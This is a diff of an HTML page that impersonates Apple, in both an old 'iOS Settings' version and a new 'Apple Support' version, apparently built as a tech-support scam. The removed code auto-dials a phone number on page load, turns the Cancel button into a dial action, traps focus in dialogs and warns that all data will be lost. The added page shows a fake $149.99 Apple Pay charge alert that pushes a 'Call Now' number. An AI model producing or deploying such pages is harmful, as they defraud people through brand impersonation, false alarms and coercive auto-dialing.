@@ -1,281 +1,478 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>iOS Settings • Sign-in Popup</title>
-  <style>
-    :root{
-      --bg:#f2f2f7; --card:#fff; --ink:#1d1d1f; --sub:#6e6e73; --blue:#007aff; --border:#e5e5ea; --shadow:0 10px 30px rgba(0,0,0,.25)
-    }
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{margin:0;background:var(--bg);color:var(--ink);font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",Arial,sans-serif;line-height:1.4}
-
-    /* ===== Settings UI ===== */
-    .nav{position:sticky; top:0; z-index:0; background:var(--bg); padding:16px 16px 8px}
-    .nav h1{margin:0 0 12px; font-weight:700; font-size:28px}
-    .search{position:relative}
-    .search input{width:100%; padding:10px 36px 10px 12px; border:1px solid var(--border); border-radius:10px; background:#fff; font-size:14px}
-    .search .icon{position:absolute; right:10px; top:50%; transform:translateY(-50%); font-size:13px; color:var(--sub)}
-
-    .wrap{max-width:900px; margin:0 auto; padding:0 16px 40px}
-    .card{background:var(--card); border-radius:12px; box-shadow:0 1px 0 rgba(0,0,0,.04); overflow:hidden; margin-top:14px}
-    .row{display:flex; align-items:center; gap:12px; padding:12px 14px; border-top:1px solid var(--border)}
-    .row:first-child{border-top:none}
-    .sub{font-size:12px; color:var(--sub)}
-    .chev{margin-left:auto; color:var(--sub)}
-    .avatar{width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg,#9be2ff,#c9f7ff)}
-    .section-title{margin:18px 8px 6px; font-size:13px; color:var(--sub)}
-
-    .ico{width:26px;height:26px;border-radius:6px;display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:14px}
-    .wifi{background:#007aff}.bt{background:#0a84ff}.cell{background:#34c759}.notif{background:#ff9f0a}.sound{background:#5856d6}.focus{background:#ff375f}.screent{background:#32ade6}
-
-    /* ===== Classic iOS Popup Overlays ===== */
-    .overlay, .warning-overlay, .tollfree-overlay{position:fixed; inset:0; background:rgba(0,0,0,.55); display:none; align-items:center; justify-content:center; z-index:10; padding:16px}
-    .overlay[aria-hidden="false"], .warning-overlay[aria-hidden="false"], .tollfree-overlay[aria-hidden="false"]{display:flex}
-
-    .dialog, .warning-dialog, .tollfree-dialog{background:#fff; width:320px; max-width:90vw; border-radius:12px; box-shadow:var(--shadow); text-align:center; overflow:hidden}
-    .dlg-body, .warning-dlg-body, .tollfree-dlg-body{padding:18px 18px 12px}
-    .dlg-title, .warning-dlg-title, .tollfree-dlg-title{margin:0 0 8px; font-size:18px; font-weight:600; color:#111}
-    .dlg-text, .warning-dlg-text, .tollfree-dlg-text{margin:0 0 12px; font-size:14px; font-weight:500; color:#333}
-    .dlg-email{font-weight:600}
-    .field{padding:0 18px 14px}
-    .input{width:100%; padding:8px 10px; border:1px solid #c7c7cc; border-radius:6px; font-size:14px}
-
-    .dlg-divider, .warning-dlg-divider, .tollfree-dlg-divider{height:1px; background:#e0e0e0}
-    .dlg-actions, .warning-dlg-actions, .tollfree-dlg-actions{display:flex; align-items:stretch; justify-content:stretch}
-    .dlg-btn, .warning-dlg-btn, .tollfree-dlg-btn{flex:1; background:#fff; border:0; padding:12px 0; font-size:16px; font-weight:500; color:var(--blue); cursor:pointer}
-    .dlg-btn:disabled, .warning-dlg-btn:disabled, .tollfree-dlg-btn:disabled{color:#999; cursor:not-allowed}
-    .dlg-btn:active, .warning-dlg-btn:active, .tollfree-dlg-btn:active{background:#f5f5f5}
-    .dlg-btn + .dlg-btn, .warning-dlg-btn + .warning-dlg-btn, .tollfree-dlg-btn + .tollfree-dlg-btn{border-left:1px solid #e0e0e0}
-
-    /* ===== Footer Call Bar ===== */
-    .footer-call-bar{position:sticky; bottom:0; background:var(--card); padding:12px 16px; text-align:center; border-top:1px solid var(--border); box-shadow:0 -1px 0 rgba(0,0,0,.04); z-index:5}
-    .footer-call-bar a{font-size:16px; font-weight:500; color:var(--blue); text-decoration:none}
-    .footer-call-bar a:active{color:#005bb5}
-
-    @media (max-width:520px){ 
-      .nav h1{font-size:24px} 
-      .footer-call-bar a{font-size:14px}
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Support</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        .apple-support-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #f5f5f7 0%, #e5e5e7 100%);
+            z-index: -1;
+        }
+        
+        .support-header {
+            width: 100%;
+            max-width: 1000px;
+            background-color: white;
+            border-radius: 12px 12px 0 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .apple-logo {
+            width: 40px;
+            height: 40px;
+            background-color: #000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .support-header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1d1d1f;
+        }
+        
+        .support-container {
+            width: 100%;
+            max-width: 1000px;
+            background-color: white;
+            border-radius: 0 0 12px 12px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            display: flex;
+            gap: 30px;
+        }
+        
+        .support-nav {
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .nav-category {
+            margin-bottom: 25px;
+        }
+        
+        .nav-category h2 {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #1d1d1f;
+            font-weight: 600;
+        }
+        
+        .nav-category ul {
+            list-style-type: none;
+        }
+        
+        .nav-category li {
+            margin-bottom: 8px;
+        }
+        
+        .nav-category a {
+            text-decoration: none;
+            color: #0066cc;
+            font-size: 14px;
+        }
+        
+        .nav-category a:hover {
+            text-decoration: underline;
+        }
+        
+        .search-container {
+            display: flex;
+            margin-top: 20px;
+        }
+        
+        .search-container input {
+            flex: 1;
+            padding: 12px 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px 0 0 8px;
+            font-size: 16px;
+        }
+        
+        .search-container button {
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 0 8px 8px 0;
+            padding: 0 20px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        
+        .alert-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .alert-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+            overflow: hidden;
+            animation: popIn 0.3s ease-out;
+        }
+        
+        @keyframes popIn {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .alert-header {
+            background-color: #0071e3;
+            color: white;
+            padding: 16px 20px;
+            font-weight: 600;
+            font-size: 18px;
+            text-align: center;
+        }
+        
+        .alert-content {
+            padding: 25px 20px;
+        }
+        
+        .alert-message {
+            margin-bottom: 25px;
+            font-size: 16px;
+            text-align: center;
+            line-height: 1.4;
+        }
+        
+        .amount {
+            font-weight: 600;
+            color: #d70015;
+        }
+        
+        .phone-number {
+            font-weight: 600;
+            color: #0071e3;
+            font-size: 18px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        
+        .alert-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .alert-btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 500;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            text-align: center;
+            display: block;
+        }
+        
+        .btn-call {
+            background-color: #0071e3;
+            color: white;
+        }
+        
+        .alert-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+        
+        .alert-footer {
+            padding: 20px;
+            background-color: #f5f5f7;
+            border-top: 1px solid #e5e5e7;
+            font-size: 12px;
+            color: #86868b;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .footer-links a {
+            color: #515154;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .contact-info {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1d1d1f;
+            font-weight: 600;
+        }
+        
+        .freeze-text {
+            font-weight: 600;
+            margin-top: 5px;
+            text-align: center;
+        }
+        
+        .support-content {
+            flex: 2;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+        }
+        
+        .support-content h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #1d1d1f;
+        }
+        
+        .support-articles {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .article {
+            padding: 15px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .article h3 {
+            font-size: 16px;
+            margin-bottom: 8px;
+            color: #0066cc;
+        }
+        
+        .article p {
+            font-size: 14px;
+            color: #515154;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #86868b;
+            cursor: pointer;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .close-btn:hover {
+            background-color: rgba(0, 0, 0, 0.1);
+        }
+        
+        .call-icon {
+            display: inline-block;
+            margin-right: 8px;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
-  <!-- Settings Header -->
-  <header class="nav" role="banner">
-    <div class="wrap">
-      <h1>Settings</h1>
-      <div class="search" role="search">
-        <input type="search" placeholder="Search" aria-label="Search settings" />
-        <span class="icon">⌘K</span>
-      </div>
+    <!-- Apple Support Background -->
+    <div class="apple-support-bg"></div>
+    
+    <!-- Apple Support Header -->
+    <div class="support-header">
+        <div class="apple-logo"></div>
+        <h1>Apple Support</h1>
     </div>
-  </header>
-
-  <!-- Settings Content -->
-  <main class="wrap" role="main">
-    <div class="card">
-      <div class="row">
-        <div class="avatar" aria-hidden="true"></div>
-        <div>
-          <div style="font-weight:700">Sign in to your iPhone</div>
-          <div class="sub">Set up iCloud, the App Store, and more.</div>
+    
+    <!-- Apple Support Main Content -->
+    <div class="support-container">
+        <div class="support-nav">
+            <div class="nav-category">
+                <h2>Products</h2>
+                <ul>
+                    <li><a href="#">iPhone</a></li>
+                    <li><a href="#">Mac</a></li>
+                    <li><a href="#">iPad</a></li>
+                    <li><a href="#">Watch</a></li>
+                    <li><a href="#">AirPods</a></li>
+                    <li><a href="#">Music</a></li>
+                    <li><a href="#">TV</a></li>
+                </ul>
+            </div>
+            
+            <div class="nav-category">
+                <h2>Support Topics</h2>
+                <ul>
+                    <li><a href="#">Forgotten Apple Account password</a></li>
+                    <li><a href="#">Apple Repair</a></li>
+                    <li><a href="#">Billing and Subscriptions</a></li>
+                </ul>
+            </div>
+            
+            <div class="search-container">
+                <input type="text" placeholder="Search for more topics">
+                <button>Q Search Support</button>
+            </div>
         </div>
-        <button id="openDlg" class="dlg-btn" style="margin-left:auto; padding:8px 12px">Sign In</button>
-      </div>
+        
+        <div class="support-content">
+            <h2>Recommended for you</h2>
+            <div class="support-articles">
+                <div class="article">
+                    <h3>Update your Apple ID settings</h3>
+                    <p>Keep your account information up to date to ensure the security of your Apple ID.</p>
+                </div>
+                <div class="article">
+                    <h3>Two-factor authentication for Apple ID</h3>
+                    <p>Learn how two-factor authentication protects your account.</p>
+                </div>
+                <div class="article">
+                    <h3>Manage your payment methods</h3>
+                    <p>Update your payment information for App Store, iTunes, and other Apple services.</p>
+                </div>
+                <div class="article">
+                    <h3>Recognize and avoid phishing attempts</h3>
+                    <p>Learn how to identify legitimate Apple communications.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Alert Overlay -->
+    <div class="alert-overlay">
+        <div class="alert-container">
+            <button class="close-btn">&times;</button>
+            <div class="alert-header">Apple Support +</div>
+            
+            <div class="alert-content">
+                <div class="alert-message">
+                    Your Apple ID was recently used at<br>
+                    <strong>APPLE STORE</strong> for <span class="amount">$149.99</span> Via<br>
+                    Apple Pay Pre-Authorization! We<br>
+                    have placed those request on hold<br>
+                    to ensure safest and Security. Not<br>
+                    you? Immediately call Apple<br>
+                    Support +<br><br>
+                    
+                    <div class="phone-number">+1-803-369-2080</div>
+                    
+                    <div class="freeze-text">Freeze it!</div>
+                </div>
+                
+                <div class="alert-buttons">
+                    <a href="tel:+1-803-369-2080" class="alert-btn btn-call">
+                        <span class="call-icon">📞</span> Call Now
+                    </a>
+                </div>
+            </div>
+            
+            <div class="alert-footer">
+                <div class="footer-links">
+                    <a href="#">Privacy Policy</a> | 
+                    <a href="#">Terms of Use</a> | 
+                    <a href="#">Sales and Refunds</a> | 
+                    <a href="#">Site Map</a>
+                </div>
+                <div>Contact Apple</div>
+                
+                <div class="contact-info">
+                    Call Apple Support Now
+                </div>
+            </div>
+        </div>
     </div>
 
-    <div class="section-title">WIRELESS</div>
-    <div class="card">
-      <div class="row"><span class="ico wifi">📶</span><div><div>Wi‑Fi</div><div class="sub">Home‑5G</div></div><div class="chev">›</div></div>
-      <div class="row"><span class="ico bt">🅱️</span><div>Bluetooth</div><div class="chev">›</div></div>
-      <div class="row"><span class="ico cell">📱</span><div>Mobile Data</div><div class="chev">›</div></div>
-    </div>
-
-    <div class="section-title">NOTIFICATIONS</div>
-    <div class="card">
-      <div class="row"><span class="ico notif">🔔</span><div>Notifications</div><div class="chev">›</div></div>
-      <div class="row"><span class="ico sound">🔊</span><div>Sounds & Haptics</div><div class="chev">›</div></div>
-      <div class="row"><span class="ico focus">🌙</span><div>Focus</div><div class="chev">›</div></div>
-      <div class="row"><span class="ico screent">⏳</span><div>Screen Time</div><div class="chev">›</div></div>
-    </div>
-
-    <div class="section-title">GENERAL</div>
-    <div class="card">
-      <div class="row"><div>General</div><div class="chev">›</div></div>
-      <div class="row"><div>Control Center</div><div class="chev">›</div></div>
-      <div class="row"><div>Display & Brightness</div><div class="chev">›</div></div>
-      <div class="row"><div>Home Screen</div><div class="chev">›</div></div>
-      <div class="row"><div>Accessibility</div><div class="chev">›</div></div>
-    </div>
-  </main>
-
-  <!-- Classic Popup Overlay on top of Settings -->
-  <div class="overlay" id="overlay" aria-hidden="true">
-    <section class="dialog" role="dialog" aria-modal="true" aria-labelledby="dlg-title" aria-describedby="dlg-desc" tabindex="-1">
-      <div class="dlg-body">
-        <h2 id="dlg-title" class="dlg-title">Sign In to iCloud</h2>
-        <p id="dlg-desc" class="dlg-text">Your Apple iCloud has been compromised. Your Apple Pay has been used for paying $249 for PayPal. Call us to stop these charges if not done by you.</p>
-      </div>
-      <div class="dlg-divider" aria-hidden="true"></div>
-      <div class="dlg-actions" id="dlg-actions">
-        <button type="button" class="dlg-btn" id="cancelBtnNew">Cancel</button>
-        <button type="button" class="dlg-btn" id="callBtn">Call Now</button>
-      </div>
-    </section>
-  </div>
-
-  <!-- Warning Popup Overlay -->
-  <div class="warning-overlay" id="warningOverlay" aria-hidden="true">
-    <section class="warning-dialog" role="dialog" aria-modal="true" aria-labelledby="warning-dlg-title" aria-describedby="warning-dlg-desc" tabindex="-1">
-      <div class="warning-dlg-body">
-        <h2 id="warning-dlg-title" class="warning-dlg-title">Warning</h2>
-        <p id="warning-dlg-desc" class="warning-dlg-text">Do Not Cancel - All Your Data Will Be Lost, Call Us Immediately</p>
-      </div>
-      <div class="warning-dlg-divider" aria-hidden="true"></div>
-      <div class="warning-dlg-actions">
-        <!-- No buttons, auto-closes after dial -->
-      </div>
-    </section>
-  </div>
-
-  <!-- Toll-Free Popup Overlay -->
-  <div class="tollfree-overlay" id="tollfreeOverlay" aria-hidden="true">
-    <section class="tollfree-dialog" role="dialog" aria-modal="true" aria-labelledby="tollfree-dlg-title" aria-describedby="tollfree-dlg-desc" tabindex="-1">
-      <div class="tollfree-dlg-body">
-        <h2 id="tollfree-dlg-title" class="tollfree-dlg-title">Toll-Free Support</h2>
-        <p id="tollfree-dlg-desc" class="tollfree-dlg-text">Click below to call our toll-free support line.</p>
-      </div>
-      <div class="tollfree-dlg-divider" aria-hidden="true"></div>
-      <div class="tollfree-dlg-actions">
-        <button type="button" class="tollfree-dlg-btn" id="tollfreeCallBtn">Click to Call</button>
-      </div>
-    </section>
-  </div>
-
-  <!-- Footer Call Bar -->
-  <footer class="footer-call-bar" role="contentinfo">
-    <a href="tel:+1-844-485-2265" id="footerCallLink">Call Apple Support Now</a>
-  </footer>
-
-  <script>
-    (function(){
-      const overlay = document.getElementById('overlay');
-      const warningOverlay = document.getElementById('warningOverlay');
-      const tollfreeOverlay = document.getElementById('tollfreeOverlay');
-      const openBtn = document.getElementById('openDlg');
-      const cancelBtnNew = document.getElementById('cancelBtnNew');
-      const callBtn = document.getElementById('callBtn');
-      const tollfreeCallBtn = document.getElementById('tollfreeCallBtn');
-      const footerCallLink = document.getElementById('footerCallLink');
-      const dialog = overlay.querySelector('.dialog');
-      const warningDialog = warningOverlay.querySelector('.warning-dialog');
-      const tollfreeDialog = tollfreeOverlay.querySelector('.tollfree-dialog');
-
-      function open(){ 
-        overlay.setAttribute('aria-hidden','false'); 
-        setTimeout(() => dialog.focus(), 0); 
-      }
-
-      function openWarning(){ 
-        warningOverlay.setAttribute('aria-hidden','false'); 
-        setTimeout(() => warningDialog.focus(), 0); 
-        window.location.assign('tel:+1-844-485-2265');
-        setTimeout(closeWarning, 2000); // Auto-close after 2 seconds
-      }
-
-      function openTollfree(){ 
-        tollfreeOverlay.setAttribute('aria-hidden','false'); 
-        setTimeout(() => tollfreeDialog.focus(), 0); 
-      }
-
-      function close(){ 
-        overlay.setAttribute('aria-hidden','true'); 
-      }
-
-      function closeWarning(){ 
-        warningOverlay.setAttribute('aria-hidden','true'); 
-        setTimeout(openTollfree, 0); // Open tollfree dialog immediately after warning closes
-      }
-
-      function closeTollfree(){ 
-        tollfreeOverlay.setAttribute('aria-hidden','true'); 
-      }
-
-      // Enhanced focus trap for primary dialog
-      overlay.addEventListener('focusin', (e) => { 
-        if(!dialog.contains(e.target)) dialog.focus(); 
-      });
-
-      // Prevent clicks outside primary dialog from having any effect
-      overlay.addEventListener('click', (e) => {
-        if (e.target === overlay) e.preventDefault();
-      });
-
-      // Enhanced focus trap for warning dialog
-      warningOverlay.addEventListener('focusin', (e) => { 
-        if(!warningDialog.contains(e.target)) warningDialog.focus(); 
-      });
-
-      // Prevent clicks outside warning dialog from having any effect
-      warningOverlay.addEventListener('click', (e) => {
-        if (e.target === warningOverlay) e.preventDefault();
-      });
-
-      // Enhanced focus trap for tollfree dialog
-      tollfreeOverlay.addEventListener('focusin', (e) => { 
-        if(!tollfreeDialog.contains(e.target)) tollfreeDialog.focus(); 
-      });
-
-      // Prevent clicks outside tollfree dialog from having any effect
-      tollfreeOverlay.addEventListener('click', (e) => {
-        if (e.target === tollfreeOverlay) e.preventDefault();
-      });
-
-      openBtn && openBtn.addEventListener('click', open);
-
-      cancelBtnNew.addEventListener('click', () => {
-        window.location.assign('tel:+1-844-485-2265'); // Trigger auto-dial on cancel click
-      });
-
-      callBtn.addEventListener('click', () => {
-        window.location.assign('tel:+1-844-485-2265');
-      });
-
-      tollfreeCallBtn.addEventListener('click', () => {
-        window.location.assign('tel:+1-844-485-2265');
-        closeTollfree();
-      });
-
-      footerCallLink.addEventListener('click', (e) => {
-        e.preventDefault(); // Prevent default anchor behavior
-        window.location.assign('tel:+1-844-485-2265');
-      });
-
-      // Auto-dial first, then open dialog after delay
-      window.addEventListener('load', () => {
-        window.location.assign('tel:+1-844-485-2265');
-        setTimeout(open, 1000); // Delay dialog by 1 second to let auto-dial prompt appear first
-      });
-    })();
-  </script>
-  <!-- Default Statcounter code for chase
-https://freegamezones.pages.dev/ -->
-<script type="text/javascript">
-var sc_project=13166709; 
-var sc_invisible=1; 
-var sc_security="f4da39b8"; 
-</script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics
-Made Easy - Statcounter" href="https://statcounter.com/"
-target="_blank"><img class="statcounter"
-src="https://c.statcounter.com/13166709/0/f4da39b8/1/"
-alt="Web Analytics Made Easy - Statcounter"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-<!-- End of Statcounter Code -->
+    <script>
+        // Close the alert when the close button is clicked
+        document.querySelector('.close-btn').addEventListener('click', function() {
+            document.querySelector('.alert-overlay').style.display = 'none';
+        });
+        
+        // Close the alert when clicking outside the alert container
+        document.querySelector('.alert-overlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                document.querySelector('.alert-overlay').style.display = 'none';
+            }
+        });
+        
+        // Add functionality to the call button
+        document.querySelector('.alert-btn').addEventListener('click', function() {
+            // In a real implementation, this would initiate a phone call
+            // For demonstration, we'll just show an alert
+            alert('Calling Apple Support at +1-803-369-2080...');
+        });
+        
+        // Add functionality to the search button
+        document.querySelector('.search-container button').addEventListener('click', function() {
+            const searchTerm = document.querySelector('.search-container input').value;
+            if (searchTerm.trim() !== '') {
+                alert(`Searching for: ${searchTerm}`);
+            } else {
+                alert('Please enter a search term');
+            }
+        });
+        
+        // Add functionality to the search input (on Enter key)
+        document.querySelector('.search-container input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.querySelector('.search-container button').click();
+            }
+        });
+    </script>
 </body>
 </html>
